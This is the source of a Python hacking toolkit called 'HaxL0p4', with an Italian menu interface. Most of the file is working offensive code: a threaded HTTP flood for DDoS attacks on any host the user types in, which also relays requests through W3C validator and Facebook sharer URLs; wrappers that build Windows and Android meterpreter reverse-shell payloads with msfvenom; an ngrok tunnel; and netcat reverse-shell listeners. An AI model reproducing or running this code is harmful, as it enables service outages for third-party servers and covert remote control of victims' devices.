#!/usr/bin/env python3

import os
import nmap
#from scapy.all import * 
import requests
import json
from colorama import Fore, Style
#from pymetasploit3.msfrpc import MsfRpcClient
#from scapy.all import RandMAC, Dot11, Dot11Beacon, Dot11Elt, RadioTap
import argparse
from tkinter import *
from tkinter import ttk
from queue import Queue
from optparse import OptionParser
import time, sys, socket, threading, logging, urllib.request, random
import subprocess
import time
import sys
import string


opzione_non_valida = f"{Fore.RED} [💀] Opzione non valida... {Style.RESET_ALL}\n"

Remote_options = f"""
 ╔══════════════════════════════════╗
 ║ [1] Payload Creator              ║ 
 ║ [2] Netcat Listener              ║
 ╚══════════════════════════════════╝
 ╔══════════════════════════════════╗
 ║ [{Fore.RED}0{Style.RESET_ALL}] Back                         ║
 ╚══════════════════════════════════╝  
"""
Network_options = f"""
 ╔══════════════════════════════════╗
 ║ [1] Network arp-scan             ║
 ║ [2] Ip & Website Scanner         ║
 ╚══════════════════════════════════╝
 ╔══════════════════════════════════╗
 ║ [{Fore.RED}0{Style.RESET_ALL}] Back                         ║
 ╚══════════════════════════════════╝
"""

moduli = {

    "windows": "windows/meterpreter/reverse_tcp",
    "android": "android/meterpreter_reverse_tcp",
    "custom": "custom",
    "exit" : "Back",

}

Moduli_Payload = f"""
 ╔═════════════════════════════════════╗
 ║ [1] {Fore.CYAN}{moduli['windows']}{Style.RESET_ALL} ║ 
 ║ [2] {Fore.CYAN}{moduli['android']}{Style.RESET_ALL} ║
 ║ [3] {Fore.CYAN}{moduli['custom']}{Style.RESET_ALL}                          ║
 ╚═════════════════════════════════════╝
 ╔═════════════════════════════════════╗
 ║ [{Fore.RED}0{Style.RESET_ALL}]: {moduli['exit']}                           ║
 ╚═════════════════════════════════════╝
"""

opzioni_menu = f"""
 ╔══════════════════════════════════╗
 ║ [1] Remote Access                ║ 
 ║ [2] Network                      ║
 ║ [3] HaxL0p4-DDos Attack          ║
 ║ [4] IP Geolocation               ║
 ║                                  ║
 ║ [{Fore.CYAN}6{Style.RESET_ALL}] Update                       ║
 ╚══════════════════════════════════╝
 ╔══════════════════════════════════╗
 ║ [{Fore.RED}0{Style.RESET_ALL}] Exit                         ║
 ╚══════════════════════════════════╝
"""


def animazione_lettere(testo, ms):
    for lettera in testo:
        print(lettera, end='', flush=True)
        time.sleep(ms)


# ========================== #



from queue import Queue
import time, sys, socket, threading, logging, urllib.request, random

def HaxL0p4_Ddos():
    os.system("clear && figlet HaxL0p4-DDos")
    animazione_lettere(f"{Fore.RED}\n [😼] HaxL0p4-DDos by L0PA on Github{Style.RESET_ALL}: {Fore.CYAN}https://github.com/L0PA{Style.RESET_ALL}\n", 0.03)
    animazione_lettere(f"{Fore.RED} [💡] f.l0p4._ on Instagram: {Style.RESET_ALL}{Fore.YELLOW}https://www.instagram.com/f.l0pa._/{Style.RESET_ALL}", 0.02)
    def user_agent():
        global uagent
        uagent=[]
        uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
        uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
        uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
        uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
        uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
        uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
        uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
        return(uagent)

    def my_bots():
        global bots
        bots=[]
        bots.append("http://validator.w3.org/check?uri=")
        bots.append("http://www.facebook.com/sharer/sharer.php?u=")
        return(bots)

    def bot_hammering(url):
        try:
            while True:
                req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
                print("\033[94m HaxL0p4-DDos is Attacking...\033[0m")
                time.sleep(.1)
        except:
            time.sleep(.1)

    def down_it(item):
        try:
            while True:
                packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host,int(port)))
                if s.sendto( packet, (host, int(port)) ):
                    s.shutdown(1)
                    print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--HaxL0p4 packet sent 💻--> \033[0m")
                else:
                    s.shutdown(1)
                    print("\033[91m shut<->down\033[0m")
                time.sleep(.1)
        except socket.error as e:
            print("\033[91m [❗] no connection! server maybe down\033[0m")
            time.sleep(.1)

    def dos(): 
        while True:
            item = q.get()
            down_it(item)
            q.task_done()

    def dos2():
        while True:
            item=w.get()
            bot_hammering(random.choice(bots)+"http://"+host)
            w.task_done()

    # Aggiunta della funzione per richiedere l'input dall'utente
    def get_user_input():
        global host
        global port
        global thr

        host = input(f"\n Inserisci l'indirizzo del server (host) {Fore.CYAN}>{Style.RESET_ALL} ")
        port = input(f" Inserisci il numero della porta (default 80) {Fore.CYAN}>{Style.RESET_ALL}  ") or 80
        thr = input(f" Inserisci il valore turbo (default 135) {Fore.CYAN}>{Style.RESET_ALL} ") or 135

        print(f"\n\033[92m {host} porta: {str(port)} turbo: {str(thr)}\033[0m")
        animazione_lettere("\033[94m Attendi...\033[0m\n\n", 0.03)

    # Inizializzazione delle code
    q = Queue()
    w = Queue()

    # Lettura degli headers
    headers = open("headers.txt", "r")
    global data
    data = headers.read()
    headers.close()

    # Chiamata alla funzione per richiedere l'input dall'utente
    get_user_input()

    user_agent()
    my_bots()
    time.sleep(5)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host,int(port)))
        s.settimeout(1)
    except socket.error as e:
        print("\033[91m Controlla l'indirizzo del server e la porta\033[0m")
        sys.exit()

    # Creazione e avvio dei thread
    for i in range(int(thr)):
        t = threading.Thread(target=dos)
        t.daemon = True
        t.start()
        t2 = threading.Thread(target=dos2)
        t2.daemon = True
        t2.start()

    # Tasking
    item = 0
    while True:
        if (item>1800):
            item=0
            time.sleep(.1)
        item = item + 1
        q.put(item)
        w.put(item)

    q.join()
    w.join()



# ========================== #

parser = argparse.ArgumentParser(description="HaxL0p4 hacking tool")
parser.add_argument('--update', action="store_true", help="Update HaxL0p4 tool")
args = parser.parse_args()

if args.update:
    os.system("git stash && git pull")
    animazione_lettere(f"\n{Fore.RED}[❗] Please restart the tool...", 0.03)
    sys.exit()
else:
    pass



def startNgrokServer():
    ngrokPORT = input("\n LOCAL PORT > ") 

    command = f"gnome-terminal --geometry=80x24+1000+70 -- bash -c 'sudo ngrok tcp {ngrokPORT}; exec bach'"
    subprocess.run(command, shell=True)



def createPayload(modulo, LHOST, LPORT, NAME, FORMAT):
    if modulo == 1:
        print("\n")
        os.system(f"sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
    elif modulo == 2:
        os.system(f"sudo msfvenom -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
    elif modulo == 3:
        typeModule = input("\nMODULE > ")
        os.system(f"sufo msfvenom -p {typeModule} LHOST={LHOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")



def setPayload():
    os.system("clear && figlet HaxL0p4")

    print(Moduli_Payload)
    
    while True:
        choice = input(f"\n{Fore.CYAN} HaxL0p4/CreatePayload {Style.RESET_ALL}> ")

        if choice not in ["1", "2", "3", "0"]:
            os.system("clear && figlet HaxL0p4")
            print(Moduli_Payload)
            opzione_non_valida = f" {Fore.RED}[💀] Opzione non valida. Si prega di inserire 'Y' o 'N'.{Style.RESET_ALL}\n"
            animazione_lettere(opzione_non_valida, 0.03)
            continue

        if choice == "0":
            os.system("clear && figlet Hax-Remote")
            print(f"""
 ╔══════════════════════════════════╗
 ║ [1] Payload Creator              ║ 
 ║ [2] Netcat Listener              ║
 ╚══════════════════════════════════╝
 ╔══════════════════════════════════╗
 ║ [{Fore.RED}0{Style.RESET_ALL}] Back                         ║
 ╚══════════════════════════════════╝  
    """)
            return
        
        lanORwan = input("\n Start WAN server? Y/N: ")

        if lanORwan.lower() == "y":
            startNgrokServer()
        elif lanORwan.lower() == "n":
            pass
        else:
            animazione_lettere(opzione_non_valida, 0.03)

        HOST = input(f"\n LHOST {Fore.CYAN}>{Style.RESET_ALL} ")

        while True:
            try:
                LPORT = int(input(f" LPORT {Fore.CYAN}>{Style.RESET_ALL} "))
                break
            except ValueError:
                print(f"\n {Fore.RED} [!] Formato non valido. Inserisci un numero intero.\n{Style.RESET_ALL}")

        FORMAT = input(f"\n FORMAT (ES: exe): {Fore.CYAN}>{Style.RESET_ALL} ")
        NAME = input(f" \n NAME {Fore.CYAN}>{Style.RESET_ALL} ")

        if choice == "1":
            createPayload(modulo=1, LHOST=HOST, LPORT=LPORT, NAME=NAME, FORMAT=FORMAT)
        elif choice == "2":
            createPayload(modulo=2, LHOST=HOST, LPORT=LPORT, NAME=NAME, FORMAT=FORMAT)
        elif choice == "3":
            module = input(f"\n Module {Fore.CYAN}> {Style.RESET_ALL}")
            os.system(f"sudo msfvenom -p {module} LHOST={HOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
        elif choice == "99":
            break
        else:
            animazione_lettere("\n"+opzione_non_valida, 0.03)


        os.system("clear && figlet HaxL0p4")
        
        msf = input(f"\nAvviare {Fore.BLUE}msfconsole{Style.RESET_ALL}? Y/N: ")
        if msf.lower() == "y":
            command = f"gnome-terminal --geometry=80x24+1000+550 -- bash -c 'msfconsole -x \"use windows/meterpreter/reverse_tcp; set LHOST {HOST}; set LPORT {LPORT}, exploit; exploit; exec bash\"'"
            subprocess.run(command, shell=True)
            return menu()
        elif msf.lower() == "n":
            return menu()


# Ascoltatore netcat reverse shell

def netcatListener():
    try:
        os.system("clear && figlet HaxL0p4-NC")

        while True:
            try:
                port = int(input("\n PORT: "))
                break
            except ValueError:
                porta_non_valida = f"{Fore.RED}\n [💀] Porta non valida...{Style.RESET_ALL}"
                animazione_lettere(porta_non_valida, 0.03)
                return netcatListener()

        proxychains = input(" Use proxychains? Y/N: ")

        if proxychains.lower() in ["y", "n"]:
            if proxychains.lower() == "y":
                os.system(f"sudo proxychains nc -lvp {port}")
            elif proxychains.lower() == "n":
                command = f"sudo nc -lvp {port}"
                os.system(command)
                while True:
                    exit = input(f'\n{Fore.BLUE}Close the revese shell?{Style.RESET_ALL} Y/N: ')
                    if exit.lower() == "y":
                        os.system("clear && figlet Hax-Remote")
                        print(Remote_options)
                        break
                    elif exit.lower() == "n":
                        return
        else:
            opzione_non_valida = f"\n{Fore.RED} [💀] Opzione non valida... Inserire Y o N. {Style.RESET_ALL}"
            animazione_lettere(opzione_non_valida, 0.03)
            return netcatListener()
        
    except KeyboardInterrupt:
        os.system("clear && figlet Hax-Remote")
        print(Remote_options)



def arp_scan():
    os.system("clear && figlet Hax-Scan")
    os.system("\n\narp-scan -l")

    back = input(f"{Fore.RED}\n\n[❔] Back? Y/N: {Style.RESET_ALL}")
    if back.lower() == "y":
        network()
    else:
        pass



def ip_scanner():
    os.system("clear && figlet HaxL0p4")

    scanner = nmap.PortScanner()

    print("\n HaxL0p4 automation hacking tool")
    print(" <-------------------------------------------------------------->")

    ip_addr = input(' Ip address do you want to scan: ')
    print(f" The ip you entered is: {Fore.RED}{ip_addr}{Style.RESET_ALL}")

    resp = input(f"""\n Please enter the type os scan do you want to run
 ╔══════════════════════════════════╗
 ║ [1] SYN ACK Scan                 ║ 
 ║ [2] UDP Scan                     ║
 ║ [3] Complete Scan                ║
 ╚══════════════════════════════════╝               
 ╔═════════════════════════════════════╗
 ║ [{Fore.RED}0{Style.RESET_ALL}]: Back                           ║
 ║ [{Fore.RED}99{Style.RESET_ALL}]: Menù                          ║
 ╚═════════════════════════════════════╝
                 
 {Fore.CYAN}HaxL0p4/Network/Scanner/IpScanner/options{Style.RESET_ALL} > """)

    if resp == "1":
        try:
            print(" \n Nmap Version: ", scanner.nmap_version())
            animazione_lettere(f" {Fore.RED}[!] Scansione in corso...{Style.RESET_ALL}\n\n ", 0.03)
            scanner.scan(ip_addr, '1-1024', arguments="-v -sS")
            print(f"tcp: method: syn, services: 1-1024\n Ip Status: up")
            open_ports = scanner[ip_addr]['tcp'].keys()
            formatted_ports = ', '.join(map(str, open_ports))
            print(" Open Ports: ", formatted_ports)
        except Exception as e:
            print(f" An error occurred: {e}")
    elif resp == "2":
        try:
            print(" \n Nmap Version: ", scanner.nmap_version())
            animazione_lettere(f" {Fore.RED}[!] Scansione in corso...{Style.RESET_ALL}\n\n ", 0.03)
            scanner.scan(ip_addr, '1-1024', arguments="-v -sU")
            print(f"udp: services: 1-1024\n Ip Status: {Fore.RED}up{Style.RESET_ALL}")
            open_ports = scanner[ip_addr]['udp'].keys()
            formatted_ports = ', '.join(map(str, open_ports))
            print(" Open Ports: ", formatted_ports)
        except Exception as e:
            print(f"An error occurred: {e}")
    elif resp == "3":
        try:
            print(" \n Nmap Version: ", scanner.nmap_version())
            animazione_lettere(f" {Fore.RED}[!] Scansione in corso...{Style.RESET_ALL}\n\n ", 0.03)
            scanner.scan(ip_addr, '1-1024', arguments="-v -sS -sC -A -O")
            print(f"tcp: method: syn, services: 1-1024\n Ip Status: up")

            # Verifica se è stato rilevato il sistema operativo
            if 'osclass' in scanner[ip_addr]:
                detected_os = scanner[ip_addr]['osclass'][0]['osfamily']
                print(f"{Fore.LIGHTCYAN_EX} Operative System: {detected_os}{Style.RESET_ALL}")
            else:
                print(f"{Fore.LIGHTCYAN_EX} Operative System: Information not available{Style.RESET_ALL}")

            open_ports = scanner[ip_addr]['tcp'].keys()
            formatted_ports = ', '.join(map(str, open_ports))
            print(" Open Ports: ", formatted_ports)
        
        except Exception as e:
            print(f" An error occurred: {e}")
    elif resp == "0":
        return ip_scanner()
    elif resp == "99":
        return menu()
    elif resp >= '4':
        animazione_lettere(opzione_non_valida, 0.03)

    loop = input("\n\n [❔] Repeat Scan? Y/N: ")
    while True:
        if loop.lower() == "y":
            return ip_scanner()
        elif loop.lower() == "n":
            return menu()
        else:
            animazione_lettere(opzione_non_valida, 0.03)



def ip_lookup():      

    os.system("clear && figlet HaxL0p4")

    ip = input(f"\n{Fore.CYAN}WEBSITE TARGET{Style.RESET_ALL} > ")
    print("\n")
    os.system(f" nslookup {ip}")

    while True:
        back = input(f"\n{Fore.RED}Repeat? Y/N: {Style.RESET_ALL}")
        if back.lower() == "y":
            ip_lookup()
        elif back.lower() == "n":
            network()
        else:
            animazione_lettere(opzione_non_valida, 0.03)


def scanner():
    os.system("clear && figlet HaxL0p4")
    
    netScan_options = f"""
 ╔═════════════════════════════════════╗
 ║ [1] IP Scanner                      ║ 
 ║ [2] Website Lookup                  ║
 ╚═════════════════════════════════════╝

 ╔═════════════════════════════════════╗
 ║ [{Fore.RED}0{Style.RESET_ALL}]: Back                           ║
 ║ [{Fore.RED}99{Style.RESET_ALL}]: Menù                          ║
 ╚═════════════════════════════════════╝
"""
    print(netScan_options)
    s = input(f"{Fore.CYAN} HaxL0p4/network/IpScanner{Style.RESET_ALL} > ")

    while True:
        if s == "1":
            ip_scanner()
        elif s == "2":
            ip_lookup()
        elif s == "0":
            return network()
        elif s == "99":
            return menu()
        else: 
            animazione_lettere("\n"+opzione_non_valida, 0.03)
            return scanner()


def network():
    os.system("clear && figlet Hax-Net")
    print(Network_options)
    choice = input(f"\n{Fore.CYAN} HaxL0p4/network{Style.RESET_ALL} > ")


    while True:
        if choice == "1":
            arp_scan()
        elif choice == "2":
            scanner()
        elif choice == "0":
            menu()
        else:
            os.system("clear && figlet Hax-Net")
            print(Network_options)
            opzione_non_valida = f"{Fore.RED} [💀] Opzione non valida...{Style.RESET_ALL}"
            animazione_lettere(opzione_non_valida, 0.03)
            return network()



def get_public_ip():
    response = requests.get("https://api.ipify.org")
    return response.text



def ipGeolocation():
    while True:
        os.system("clear && figlet HaxL0p4")

        public_ip = get_public_ip()
        print(f"\nYour ip address: {Fore.RED}{public_ip}{Style.RESET_ALL}")
        print(f'\nType "{Fore.RED}0{Style.RESET_ALL}" for return back')

        ip_address = input("\nip: ")

        if ip_address == "0":
            return

        request_url = 'https://geolocation-db.com/jsonp/' + ip_address
        response = requests.get(request_url)
        result = response.content.decode()
        result = result.split("(")[1].strip(")")
        result = json.loads(result)

        print("\nGeolocation Information:")
        print(f"Country Code: {result['country_code']}")
        print(f"Country Name: {result['country_name']}")
        print(f"City: {result['city']}")
        print(f"Postal Code: {result['postal']}")
        print(f"Latitude: {result['latitude']}")
        print(f"Longitude: {result['longitude']}")
        print(f"IPv4 Address: {result['IPv4']}")
        print(f"State: {result['state']}")

        back = input(f"\n{Fore.RED}[❔] Back Y/N: {Style.RESET_ALL}")

        if back.lower() == "y":
            return
        elif back.lower() == "n":
            pass
        else:
            print("Opzione non valida...")




def RemoteAccess() :
    try:
        os.system("clear && figlet Hax-Remote ")
        print(Remote_options)

        while True:   
            choice = input(f"\n{Fore.CYAN} HaxL0p4/RemoteAccess{Style.RESET_ALL} > ")    
            if choice == "1" :
                setPayload()
            elif choice == "2" :
                netcatListener()
            elif choice == "0":
                return
            elif choice == "back":
                return
            else: 
                os.system("clear && figlet Hax-Remote")
                print(Remote_options)
                animazione_lettere(opzione_non_valida, 0.03)
    except KeyboardInterrupt:

        while True:
            exit = input(f"\n{Fore.RED} \n [{Style.RESET_ALL}*{Fore.RED}]{Style.RESET_ALL}{Fore.LIGHTCYAN_EX} Chiudere il programma? Y/N: {Style.RESET_ALL}")
            if exit.lower() == "y":
                chiusura = f"{Fore.GREEN}\n [🐱]{Style.RESET_ALL} {Fore.RED}È stato un piacere :)... {Style.RESET_ALL}"
                animazione_lettere(chiusura, 0.03)
                break
            elif exit.lower() == "n":
                return RemoteAccess()
            else:
                animazione_lettere(opzione_non_valida, 0.03)



def menu():
    try:
        while True:
            os.system("clear && figlet HaxL0p4")
            prossimamente = f" \n{Fore.RED} [!] Coming Soon...{Style.RESET_ALL}"

            print(opzioni_menu)

            s = input(f"{Fore.CYAN} \n HaxL0p4{Style.RESET_ALL} > ")

            if s == "1":
                RemoteAccess()
            elif s == "2":
                network()
            elif s == "3":
                while True:
                    HaxL0p4_Ddos()
            elif s == "4":
                ipGeolocation()
            elif s == "6":
                os.system("git stash && git pull")
                animazione_lettere(f"\n{Fore.RED}[❗] Please restart the tool...", 0.03)
                break
            elif s == "0":
                sys.exit()
            else: 
                animazione_lettere("\n"+opzione_non_valida, 0.03)
                return menu()
    except KeyboardInterrupt:
        while True:
            exit = input(f"\n{Fore.RED} \n[{Style.RESET_ALL}*{Fore.RED}]{Style.RESET_ALL}{Fore.LIGHTCYAN_EX}Chiudere il programma? Y/N: {Style.RESET_ALL}")
            if exit.lower() == "y":
                chiusura = f"{Fore.GREEN}\n[🐱]{Style.RESET_ALL} {Fore.RED}È stato un piacere :)... {Style.RESET_ALL}"
                animazione_lettere(chiusura, 0.03)
                break
            elif exit.lower() == "n":
                return menu()
            else:
                animazione_lettere(opzione_non_valida, 0.03)

menu()
